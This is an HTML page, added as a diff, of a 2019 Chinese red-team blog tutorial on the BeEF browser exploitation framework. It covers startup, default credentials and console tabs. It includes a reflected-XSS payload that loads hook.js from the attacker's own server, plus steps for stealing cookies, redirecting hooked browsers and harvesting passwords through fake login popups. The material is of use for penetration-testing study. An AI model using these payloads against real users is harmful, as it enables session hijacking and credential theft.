@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>BeEF的高级烹饪方式 | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">BeEF的高级烹饪方式</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">June 17, 2019&nbsp;&nbsp;21:56:12</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%AD%A6%E5%99%A8%E5%BA%93/">武器库</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1307788&auto=1&height=66"></iframe>
+
+<h2 id="BeEF介绍"><a href="#BeEF介绍" class="headerlink" title="BeEF介绍"></a>BeEF介绍</h2><blockquote>
+<p>BeEF是浏览器攻击框架的简称，是一款专注于浏览器端的渗透测试工具</p>
+</blockquote>
+<p>Kali Linux内已经有BeEF的环境，只需要进入<code>/usr/share/beef-xss</code>目录下，<code>./beef</code>运行即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/beef-xss/</span><br><span class="line"></span><br><span class="line">./beef</span><br></pre></td></tr></table></figure>
+
+<p>BeEF运行截图：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/81.png" alt="图片"></p>
+<p><code>BeEF</code>启动之后会输出在<code>终端</code>很多重要的<code>信息</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Browser Exploitation Framework (BeEF) 0.4.7.0-alpha（BeEF的版本是0.4.7.0）</span><br><span class="line"></span><br><span class="line">12 extensions enabled（12个扩展）</span><br><span class="line"></span><br><span class="line">254 modules enabled（254个利用模块）</span><br><span class="line"></span><br><span class="line">接口控制面板：：</span><br><span class="line"></span><br><span class="line">running on network interface: 127.0.0.1</span><br><span class="line"></span><br><span class="line">Hook URL: http://127.0.0.1:3000/hook.js</span><br><span class="line"></span><br><span class="line">UI URL:   http://127.0.0.1:3000/ui/panel</span><br><span class="line"></span><br><span class="line">running on network interface: 192.168.1.106</span><br><span class="line"></span><br><span class="line">Hook URL: http://192.168.1.106:3000/hook.js</span><br><span class="line"></span><br><span class="line">UI URL:   http://192.168.1.106:3000/ui/panel</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="使用BeEF控制台："><a href="#使用BeEF控制台：" class="headerlink" title="使用BeEF控制台："></a>使用BeEF控制台：</h2><p>URL：（下面两个都可以使用）</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:3000/ui/panel">http://127.0.0.1:3000/ui/panel</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.106:3000/ui/panel">http://192.168.1.106:3000/ui/panel</a></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/82.png" alt="图片"></p>
+<h2 id="登陆凭据："><a href="#登陆凭据：" class="headerlink" title="登陆凭据："></a>登陆凭据：</h2><p>用户名/密码：beef</p>
+<p>用户名密码的配置文件是：config.yaml</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/84.png" alt="图片"></p>
+<h2 id="BeEF主框架控制台页面："><a href="#BeEF主框架控制台页面：" class="headerlink" title="BeEF主框架控制台页面："></a>BeEF主框架控制台页面：</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/83.png" alt="图片"></p>
+<blockquote>
+<p>Before being able to fully explore the framework you will have to ‘hook’ a browser. To begin with you can point a browser towards the basic demo page here, or the advanced version here.</p>
+</blockquote>
+<p>鼠标点击<code>here</code>就可以让浏览器和BeEF挂钩（僵尸）</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/85.png" alt="图片"></p>
+<p>其中<code>192.168.1.100</code>就是我物理机的<code>IP</code>地址</p>
+<p>下图是我们获取到的浏览器的信息：</p>
+<p>包括浏览的<code>URL</code>、<code>Cookies</code>、<code>Host Name/IP</code>、<code>Date</code>、<code>操作系统</code>…等等</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/86.png" alt="图片"></p>
+<p>其中<code>Commands</code>标签页是BeEF执行大部分攻击模块的地方</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/87.png" alt="图片"></p>
+<p><code>绿色</code>的代表该<code>功能有效</code>，并且执行<code>不会被</code>用户所发现</p>
+<p><code>橙色</code>的代表该<code>功能有效</code>，但是执行<code>会被</code>用户所发现</p>
+<p><code>白色</code>的代表该功能<code>不确定</code>是否有效</p>
+<p><code>红色</code>的代表该<code>功能无效</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/88.png" alt="图片"></p>
+<p>其中<code>Rider</code>标签页可以让挂钩(僵尸)的浏览器作为一个代理</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/89.png" alt="图片"></p>
+<p>其中<code>XssRays</code>标签页可以帮助我们让挂钩(僵尸)的浏览器的网站<code>所在域</code>作为目标，然后通过BeEF框架搜索<code>跨站脚本攻击</code>，允许我们让挂钩的网站上找到<code>持久的跨站脚本漏洞攻击</code>的漏洞进行利用</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/90.png" alt="图片"></p>
+<p>其中<code>Ipec</code>标签页可以在<code>http</code>请求中使用<code>http</code>以外的协议等等</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/91.png" alt="图片"></p>
+<blockquote>
+<p>因为我们使用的是BeEF自带的挂钩页面所演示，在实战中可以用反射类型的XSS来进行对用户的浏览器进行钓鱼、DNS欺骗、网站克隆等等操作</p>
+</blockquote>
+<h2 id="使用XSS进行BeEF挂钩："><a href="#使用XSS进行BeEF挂钩：" class="headerlink" title="使用XSS进行BeEF挂钩："></a>使用XSS进行BeEF挂钩：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.liuwx.cn/xss.php?=&quot;&gt;&lt;script src=&quot;http://192.168.1.106:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这时候<code>BeEF</code>控制台就会看到一个新的挂钩(僵尸)浏览器：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/92.png" alt="图片"></p>
+<h2 id="使用BeEF对僵尸浏览器进行攻击"><a href="#使用BeEF对僵尸浏览器进行攻击" class="headerlink" title="使用BeEF对僵尸浏览器进行攻击"></a>使用BeEF对僵尸浏览器进行攻击</h2><h3 id="获取用户Cookie"><a href="#获取用户Cookie" class="headerlink" title="获取用户Cookie"></a>获取用户Cookie</h3><p>来到<code>Commands</code>标签-点击<code>Browser</code>—&gt;<code>Hooked Domain</code> —&gt;<code>Get Cookie</code>，然后点击右下角的<code>Execute</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/93.png" alt="图片"></p>
+<p>此时右边就可以看到浏览器的<code>Cookie</code>了</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/94.png" alt="图片"></p>
+<h3 id="对网页进行重定向"><a href="#对网页进行重定向" class="headerlink" title="对网页进行重定向"></a>对网页进行重定向</h3><p>来到<code>Commands</code>标签-点击<code>Browser</code>—&gt;<code>Hooked Domain</code> —&gt;<code>Redirect Browser</code>，然后点击右下角的<code>Execute</code>，然后用户的浏览器的该页面就会跳转到<code>http://www.liuwx.cn</code>的页面了。</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/95.png" alt="图片"></p>
+<p>成功跳转</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/96.png" alt="图片"></p>
+<h3 id="对网页进行社工弹窗"><a href="#对网页进行社工弹窗" class="headerlink" title="对网页进行社工弹窗"></a>对网页进行社工弹窗</h3><p>来到<code>Commands</code>标签-点击<code>Social Engiineering</code>——&gt;<code>Pretty Theft</code> ，然后右上角选择弹窗的类型，右下角点击 <code>Execute</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/97.png" alt="图片"></p>
+<blockquote>
+<p>说实话，这个弹窗有点鸡肋，看上去太假了，建议不要使用这个</p>
+</blockquote>
+<p>但是你只要在框内<code>输入了</code>用户名和密码的话</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/98.png" alt="图片"></p>
+<p>如果<code>僵尸</code>那边输入了<code>用户名</code>和<code>密码</code>，点击了<code>登陆</code>的话，控制台是会收到<code>账号密码</code>的</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/99.png" alt="图片"></p>
+<p>目前<code>BeEF</code>使用就到这，后续遇到其他的玩法还会继续更新… …</p>
+<p>未完待续… …</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2019/06/17/beef-xss/">http://example.com/2019/06/17/beef-xss/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Beef/"># Beef</a>
+                    
+                        <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"># 工具使用</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/07/06/metasploit-2/">Metasploit-基本使用和控制台命令</a>
+            
+            
+            <a class="next" rel="next" href="/2019/06/17/penetrationtest-4/">浅谈XXE漏洞</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
